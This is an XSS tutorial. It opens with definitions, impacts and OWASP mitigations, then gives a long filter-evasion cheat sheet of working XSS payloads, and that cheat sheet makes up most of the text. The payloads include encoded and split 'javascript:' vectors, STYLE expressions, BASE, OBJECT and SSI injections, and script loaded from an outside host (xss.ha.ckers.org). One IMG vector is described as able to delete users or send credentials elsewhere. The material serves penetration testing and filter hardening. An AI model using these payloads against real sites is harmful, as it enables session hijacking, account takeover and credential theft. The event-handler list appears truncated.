Cross-Site Scripting (XSS)

What is it?

Put simply, Cross-Site Scripting allows an attacker to execute script(s) in a victim’s browser. This can be used to hijack user sessions (by getting cookies, session ID’s and so on), alter the contents of a web page or redirect a user to an evil site. There are two common types:

    Stored XSS: this is when an injected script is stored on the server in a fixed location. The classic example is a forum post, where every user which requests the post from the server will subsequently be affected by the XSS attack. Also referred to as Persistent or Type-I XSS. For this reason, it is usually classified as the most severe since it will typically impact the highest number of users.
    Reflected XSS: this is when an injected script within a request is reflected back in the server’s response. A common example is a search feature which responds by printing (or reflecting) the user’s malicious search input as well as outputting the search information. Given this format, a reflected XSS attack must involve targeting a victim through another method such as social engineering in order to get them to send the request which elicits a reflected response. Also referred to as non-persistent or Type-II XSS.

There is also a third, lesser-known XSS attack vector:

    DOM-based XSS: as the name suggests, this type of XSS differs from the other two types in that it appears in the DOM (Document Object Model) rather than the HTML document. This means that the latter is not modified, and so the payload will not be found in the server’s response — it can instead be identified by investigating the DOM of the page. A trivial DOM-based XSS payload could look like this:

http://www.example.com/test.html#<script>alert(1)</script>
When Does it Happen?

We’ll break this down by the different XSS types, since they can have different causes:

    Stored & Reflected XSS: the web app or API stores user input which is unsanitised, unescaped, unvalidated or fails to be encoded.
    DOM-based XSS: JavaScript frameworks, single-page applications and APIs which dynamically include user-inputted data are vulnerable to this type of attack.
    
Impact of XSS:

XSS can lead to the following

1.steal credentials in non HTTPOnly cookies.

2.send requests to a server with the user's credentials. 

3.steal secrets that are stored in JS variables.

4.prompt the user to download content by submitting a form

5.display text that seems to come from the site owners. (Phishing)

6.display a password input, log keystrokes, and send the result to a site of your choosing

7.redirect to another site

8.get GPS/camera data if the user has granted that site access to the device


How to Mitigate Cross-Site Scripting Attacks

OWASP have a couple of excellent XSS prevention cheat sheets: one for reflected/stored attacks, and another for DOM-based attacks. The main steps to enforce are:

    Employ a combination of validating, filtering, encoding and escaping methods to prevent untrusted user input from executing on the web app. The first OWASP cheat sheet listed above goes into extended detail about methods you can use to prevent malicious input executing as intended.
    Move to frameworks which automatically escape XSS by design (recent Ruby on Rails version, React JS).
    Enforce secure headers (such as X-XSS-Protection: 1; mode=block and Content-Security-Policy).

https://n0p.net/penguicon/php_app_sec/mirror/xss.html

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
XSS locator (inject this string, view source and search for "XSS", if you see "<XSS" verses "&lt;XSS" it may be vulnerable):
'';!--"<XSS>=&{()}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Normal XSS:
 <IMG SRC="javascript:alert('XSS');">
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 No quotes and no semicolon:
<IMG SRC=javascript:alert('XSS')>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Case insensitive XSS attack vector:
<IMG SRC=JaVaScRiPt:alert('XSS')>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 HTML entities:
<IMG SRC=JaVaScRiPt:alert(&quot;XSS&quot;)>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 UTF-8 Unicode encoding (almost all of these encoding methods work only in Internet Explorer and Opera):
<IMG
SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Long UTF-8 Unicode encoding without semicolons (this is often effective in XSS that attempts to look for &#XX, since most people don't know about padding - up to 7 numeric charachters total). This is also useful against people who decode against strings like $tmp_string =~ s/.*\&#(\d+);.*/$1/; which incorrectly assumes a semicolon is required to terminate a html encoded string (I've seen this in the wild):

<IMG
SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Hex encoding without semicolons (this is also a viable attack against the above string $tmp_string =~ s/.*\&#(\d+);.*/$1/; which assumes that there is a numeric charachter following the pound symbol - which is not true with hex HTML charachters):
<IMG
SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Embedded tab to break up XSS. This works in IE and Opera. Some websites claim than any of the chars 09-13 (decimal) will work for this attack. That is incorrect. Only 09 (horizontal tab), 10 (newline) and 13 (carriage return) work. See the ascii chart for more details. The following four XSS examples illustrate this vector:
<IMG SRC="jav&#x09;ascript:alert('XSS');">
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Embedded newline to break up XSS:
<IMG SRC="jav&#x0A;ascript:alert('XSS');">
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Embedded carriage return to break up XSS:
<IMG SRC="jav&#x0D;ascript:alert('XSS');">
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Okay, I lied, null chars also work as XSS vectors in both IE and older versions of Opera, but not like above, you need to inject them directly using something like Burp Proxy or if you want to write your own you can either use vim (^V@ will produce a null) or the following program to generate it into a text file. Okay, I lied again, older versions of Opera (circa 7.11 on Windows) were vulnerable to one additional char 173 (the soft hypen control char). But the null char %00 is much more useful and helped me bypass certain real world filters with a variation on this example: 
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Spaces before the JavaScript in images for XSS (this is useful if the pattern match doesn't take into account spaces in the word "javascript:" -which is correct since that won't render- and makes the false assumption that you can't have a space between the quote and the "javascript:" keyword):
<IMG SRC="   javascript:alert('XSS');">
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
XSS with no single quotes or double quotes or semicolons:
<SCRIPT>a=/XSS/
alert(a.source)</SCRIPT>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 BODY image:
<BODY BACKGROUND="javascript:alert('XSS')">
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
BODY tag (I like this method because it doesn't require using any variants of "javascript:" or "<SCRIPT..." to accomplish the XSS attack):
<BODY ONLOAD=alert('XSS')>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Event Handlers that can be used in similar XSS attacks to the one above (this is the most comprehensive list on the net, at the time of this writing):

4. onAfterPrint() (activates after user prints or previews print job)
5. onAfterUpdate() (activates on data object after updating data in the
source object)
6. onBeforeActivate() (fires before the object is set as the active
element)

Meta (the odd thing about meta refresh is that it doesn't send a referrer in the header on IE, Firefox, Netscape or Opera - so it can be used for certain types of attacks where you need to get rid of referring URLs):
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Iframe (if iframes are allowed there are a lot of other XSS problems as well):
 <IFRAME SRC=javascript:alert('XSS')></IFRAME>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Frame (frames have the same sorts of XSS problems as iframes):
 <FRAMESET><FRAME SRC=javascript:alert('XSS')></FRAME></FRAMESET>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Tables (who would have thought tables were XSS targets... except me, of course):
 <TABLE BACKGROUND="javascript:alert('XSS')">
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Div background-image:
 <DIV STYLE="background-image: url(javascript:alert('XSS'))">
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Div behavior for *.htc XSS exploits (Netscape only):
 <DIV STYLE="behaviour: url('http://xss.ha.ckers.org/exploit.htc');">
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Div expression (IE only) - a variant of this was effective against a real world XSS filter using a newline between the colon and "expression":
 <DIV STYLE="width: expression(alert('XSS'));">
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 STYLE tags with broken up JavaScript for XSS:
 <STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
IMG STYLE with expression (this is really a hybrid of the above XSS vectors, but it really does show how hard STYLE tags can be to parse apart): 
<IMG STYLE='
xss: 
expre\ssion(alert("XSS"))'>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 STYLE tag (Netscape only):
 <STYLE TYPE="text/javascript">alert('XSS');</STYLE>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 STYLE tag using background-image:
 <STYLE TYPE="text/css">.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 STYLE tag using background:
 <STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
BASE tag. You need the // to comment out the next charachters so you won't get a JS error and your XSS tag will render. Also, this relies on the fact that the website uses dynamically placed images like "/images/image.jpg" rather than full paths:
<BASE HREF="javascript:alert('XSS');//">
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
OBJECT tag (IE only, but if they allow objects, you can also inject virus payloads to infect the users, etc. and same with the APPLET tag):
<OBJECT data=http://xss.ha.ckers.org width=400 height=400 type=text/x-scriptlet">
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Using an OBJECT tag you can imbed a flash movie that contains XSS:
 getURL("javascript:alert('XSS')")
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Using the above action script inside flash can obfuscate your XSS vector:
a="get";
b="URL";
c="javascript:";
d="alert('XSS');";
eval(a+b+c+d);
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 XML:
 <XML SRC="javascript:alert('XSS');">
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Assuming you can only write into the <IMG SRC="$yourinput"> field and the string "javascript:" is recursively removed:
 "> <BODY ONLOAD="a();"><SCRIPT>function a(){alert('XSS');}</SCRIPT><"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Assuming you can only fit in a few charachters and it filters against ".js" you can rename your JavaScript file to an image as an XSS vector:
<SCRIPT SRC="http://xss.ha.ckers.org/xss.jpg"></SCRIPT>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Half open HTML/JS XSS vector. This is useful as a vector because it doesn't require a close angle bracket. This assumes there is ANY HTML tags below where you are injecting your XSS. Even though there is no close ">" tag the tags below it will close it. Two notes 1) this does mess up the HTML, depending on what HTML is beneath it and 2) you definitely need the quotes or it will cause your JavaScript to fail as the next line it will try to render will be something like "</TABLE>". As a side note, this was also affective against a real world XSS filter I came accross using an open ended IFRAME tag instead of an IMG tag:
 <IMG SRC="javascript:alert('XSS')"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 SSI (Server Side Includes) requires SSI to be installed on the server: 
 <!--#exec cmd="/bin/echo '<SCRIPT
SRC'"--><!--#exec cmd="/bin/echo
'=http://xss.ha.ckers.org/a.js></SCRIPT>'"-->

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 IMG Embedded commands - this works when the webpage where this is injected (like a web-board) is behind password protection and that password protection works with other commands on the same domain. This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc.... This is one of the lesser used but most useful XSS vectors: 
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
